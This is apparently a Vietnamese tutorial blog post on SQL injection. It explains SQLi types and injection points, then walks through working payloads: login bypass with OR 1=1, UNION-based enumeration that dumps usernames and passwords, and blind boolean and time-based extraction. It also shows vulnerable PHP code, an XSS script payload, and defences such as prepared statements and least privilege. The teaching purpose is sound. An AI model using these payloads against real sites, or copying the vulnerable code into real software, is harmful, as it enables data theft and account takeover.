SQL Injection – Từ “câu SQL vô hại” đến vé VIP vào DB

1) SQL Injection là gì?

SQL Injection (SQLi) là lỗi bảo mật cho phép kẻ tấn công chèn/tiêm câu lệnh SQL vào input ứng dụng để thay đổi hoặc chiếm quyền điều khiển truy vấn tới cơ sở dữ liệu (DB). Khi truy vấn bị “đầu độc”, attacker có thể:

  • Đọc dữ liệu nhạy cảm (tài khoản, email, token…)
  • Sửa / xóa dữ liệu
  • Thực thi chức năng ngoài ý muốn (đổi mật khẩu admin, reset phiên…)
  • Thậm chí RCE gián tiếp nếu DB/stack cho phép gọi OS command

💡 Ví dụ dễ hiểu (đi xem phim):

  • Bình thường: bạn đưa vé thật → anh soát vé check xong cho qua.
  • Hacker: đưa vé giả nhưng thêm câu nịnh: “Em không có vé… OR anh đẹp trai thì cho em vào.” 😅

❌ Với con người, anh soát vé sẽ bật cười và đuổi ra.

✅ Nhưng với database, nó ngây thơ, thấy có chữ OR và điều kiện sau luôn đúng (anh nào mà chẳng tự tin là đẹp trai 🤭) → kết quả cho qua hết.

Đây chính là ý nghĩa của OR 1=1 trong SQL Injection.

User Input:  ' OR '1'='1
                ↓
SELECT * FROM users WHERE name='' OR '1'='1' AND pass='';
                               └──► luôn TRUE → bypass login

2) Tại sao lại có SQLi?

  • Tin user input như tin người yêu cũ quay lại 🥲
  • Ghép chuỗi trực tiếp để tạo query (string concatenation)
  • Kiểm tra “đầu cuối” yếu: chỉ check phần đuôi file, chỉ lọc vài ký tự…
  • DB user có nhiều quyền quá (ví dụ root), query lỗi là game over

Ví dụ “code ngây thơ” (PHP, bad):

// BAD ❌
$username = $_POST['u'];
$password = $_POST['p'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);

3) Phân loại SQLi

3.1 In-band SQLi

  • Error-based: lợi dụng lỗi trả về để lộ thông tin (version, schema…)
  • UNION-based: nối thêm UNION SELECT để đọc dữ liệu từ bảng khác

3.2 Blind SQLi

  • Boolean-based: dùng điều kiện đúng/sai để “cắn câu” dữ liệu
  • Time-based: dùng SLEEP()/BENCHMARK() để đo timing, suy luận dữ liệu

3.3 Out-of-band SQLi

  • Lấy dữ liệu qua kênh phụ (DNS, HTTP out), khi in-band/Blind bị chặn
SQLi
├── In-band
│   ├── Error-based
│   └── UNION-based
├── Blind
│   ├── Boolean-based
│   └── Time-based
└── Out-of-band (DNS/HTTP)

4) Vị trí dễ bị SQLi (Injection points)

  • Query string: ?id=1
  • Form fields: username, password, search…
  • Headers: User-Agent, Referer, X-Forwarded-For
  • Cookie: session, tracking id
  • JSON body / GraphQL: trường input động
  • Hidden field: dev tưởng “ẩn là an toàn” → không!

Ví dụ request:

GET /product.php?id=1 HTTP/1.1
Host: shop.local
User-Agent: normal-browser
Cookie: uid=42

Payload thử: id=1' OR '1'='1 hoặc đẩy qua User-Agent:

User-Agent: normal' OR '1'='1

5) Cách khai thác (Flow tấn công thực tế)

Bước 1: Thăm dò

  • Thử ' " ) -- để xem ứng dụng có lỗi cú pháp
  • Quan sát response: 500, SQL error, hay hành vi khác lạ

Bước 2: Xác định cột / kiểu dữ liệu (UNION-based)

id=1 UNION SELECT NULL,NULL -- -         -- đo số cột
id=1 UNION SELECT 1,@@version -- -        -- lộ version
id=1 UNION SELECT 1,database() -- -       -- DB hiện tại
id=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- -

Bước 3: Blind extraction

Boolean-based:

id=1 AND (SELECT SUBSTR(database(),1,1)='a')

Time-based (MySQL):

id=1 AND IF(SUBSTR(user(),1,1)='r', SLEEP(3), 0)

Bước 4: Mở rộng surface

  • Test headers/cookie: nhiều hệ thống log lại header vào DB → SQLi bất ngờ
  • Test search / filter nhiều điều kiện

Lưu ý: enum schema → đọc dữ liệu → nâng cấp tấn công.

6) Ví dụ tổng hợp (MySQL)

Giả sử trang profile.php?id=3:

  • Dò số cột: 
    ?id=3 ORDER BY 1 -- -
?id=3 ORDER BY 2 -- -
?id=3 ORDER BY 3 -- -  (OK)
?id=3 ORDER BY 4 -- -  (Lỗi) → bảng có 3 cột
  • Lấy version + DB hiện tại: 
    ?id=3 UNION SELECT 1,@@version, database() -- -
  • Liệt kê bảng: 
    ?id=3 UNION SELECT 1,2, group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema=database() -- -
  • Đọc cột nhạy cảm: 
    ?id=3 UNION SELECT 1,2, group_concat(username,':',password) FROM users -- -

7) Hậu quả (Impact)

  • Data breach: rò rỉ user, email, số thẻ…
  • Account takeover: chiếm quyền admin nếu hash yếu/logic sai
  • Integrity damage: sửa dữ liệu (giá tiền, đơn hàng…)
  • Pivot: leo thang vào nội mạng nếu DB host có thông tin nhạy cảm
  • Khả năng RCE (LOAD_FILE/OUTFILE, xp_cmdshell… tùy DB/privilege)

“Cửa mở toang”:

  App ─┬─> DB (bị tiêm SQL)
       └─> Logs/Jobs (DB creds) ──> Pivot vào hệ thống khác

8) Phòng thủ

8.1 Prepared Statements / Parameterized Query

Vấn đề: Ghép chuỗi = dữ liệu user có thể biến thành lệnh SQL.

Giải pháp: Prepared Statement = query có sẵn khung với placeholder (? hoặc :name). DB sẽ biên dịch query trước, sau đó gắn dữ liệu vào → dữ liệu chỉ là giá trị, không thể biến thành lệnh.

Ví dụ sai (dính SQLi):

$sql = "SELECT * FROM users WHERE username='" . $_POST['u'] . "' AND password='" . $_POST['p'] . "'";

Ví dụ đúng (Prepared):

$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$u, $p]);

Ở đây, ? là placeholder. $u, $p chỉ được coi là dữ liệu để so sánh, không thể chen thêm logic SQL.

8.2 Validate & Encode

  • Validate (Input Validation): kiểm tra dữ liệu hợp lệ (tuổi là số, email đúng format).
if (!ctype_digit($age)) { die("Invalid age"); }
  • Encode (Output Encoding): escape khi hiển thị lại dữ liệu để ngăn XSS.

Ví dụ hacker nhập:

<script>alert('Hacked!');</script>

Nếu in thẳng ra:

echo "Welcome, " . $_GET['name'];

→ trình duyệt chạy script.

Cách đúng:

echo "Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES);

8.3 Least Privilege (Giảm quyền DB)

  • Không dùng user root cho app.
  • Chỉ cấp quyền tối thiểu (SELECT/INSERT).

Ví dụ MySQL:

CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'StrongPass123';
GRANT SELECT, INSERT ON mydb.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

👉 Nếu hacker SQLi thành công, họ chỉ đọc/ghi được, không thể xóa bảng hay chiếm toàn bộ DB.

8.4 Error Handling (Ẩn lỗi & Logging)

  • Không trả lỗi SQL chi tiết cho user:❌ SQL syntax error near 'UNION'
  • Thay vào đó:✅ An error occurred. Please try again later.
  • Log chi tiết để dev phân tích.

8.5 Web Application Firewall (WAF)

  • Lọc request chứa payload phổ biến.
  • Không hoàn hảo, nhưng thêm lớp bảo vệ.

8.6 ORM không phải “thuốc tiên”

  • ORM (Eloquent, Hibernate, Django ORM…) thường hỗ trợ query an toàn.
  • Nhưng nếu dev viết query raw thì vẫn dính SQLi.

Ví dụ xấu:

DB::select("SELECT * FROM users WHERE name = '$input'");

Ví dụ đúng:

User::where('name', $input)->get();

9) Quy trình test nhanh

  1. Xác định nơi nhận input (param/header/cookie)
  2. Thử ký tự phá cú pháp ' " ) --
  3. Quan sát lỗi/khác biệt response
  4. Thử UNION xác định số cột → enum schema
  5. Nếu không lộ lỗi → chuyển sang Blind (boolean/time)
  6. Ghi chú payload hiệu quả + thời gian phản hồi
  7. Đề xuất fix: Prepared + Validate + Least Privilege
Input → Lỗi? → (Có) → In-band → UNION/Error
             └→ (Không) → Blind → Boolean/Time
